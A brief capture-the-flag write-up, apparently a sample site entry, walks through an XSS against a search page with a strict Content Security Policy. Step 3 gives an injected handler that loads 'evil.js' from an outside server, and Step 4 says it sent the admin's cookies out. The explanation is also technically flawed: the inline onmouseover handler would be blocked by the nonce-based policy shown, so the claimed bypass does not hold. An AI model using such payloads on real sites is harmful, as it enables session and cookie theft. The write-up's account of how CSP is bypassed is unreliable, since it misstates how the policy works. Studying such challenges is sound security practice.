---
title: "XSS Challenge"
date: "2025-06-19"
ctf: "Example CTF 2025"
category: "Web"
difficulty: "Medium"
points: 500
tags: ["xss", "javascript", "csp"]
author: "Tham Le"
solved: true
featured: true
description: "A walkthrough of an interesting XSS challenge that required bypassing a Content Security Policy."
---

# XSS Challenge

**Category:** Web  
**Difficulty:** Medium  
**Points:** 500  
**Event:** Example CTF 2025

## Challenge Description

This challenge asked us to bypass a strict Content Security Policy to execute JavaScript on the admin's browser.

## Solution

The website had a search feature that reflected our query in the page without proper sanitization, making it vulnerable to XSS. However, there was a strict CSP in place:

```
Content-Security-Policy: default-src 'self'; script-src 'nonce-random123' 'strict-dynamic'; object-src 'none';
```

### Step 1: Analyzing the CSP

The CSP uses `nonce-random123` which means only scripts with this specific nonce attribute would be allowed to execute. Additionally, `strict-dynamic` means that any script loaded by a trusted script would also be trusted.

### Step 2: Finding the Vulnerability

I found that the site included a script with the correct nonce that loaded jQuery:

```html
<script nonce="random123" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
```

### Step 3: Exploit

I used jQuery's `$.getScript()` method which would inherit the trust from the initial script due to strict-dynamic:

```javascript
<input value="x" onmouseover="$.getScript('https://my-server.com/evil.js')">
```

### Step 4: Getting the Flag

When the admin viewed the page with my payload, their browser executed my JavaScript which exfiltrated the admin's cookies to my server, containing the flag.

## Flag

`flag{x55_c5p_byp455_m45t3r}`

## Lessons Learned

- CSP can be bypassed if strict-dynamic is used alongside trusted scripts that provide execution methods
- Always validate and sanitize user input, especially when reflecting it in the page
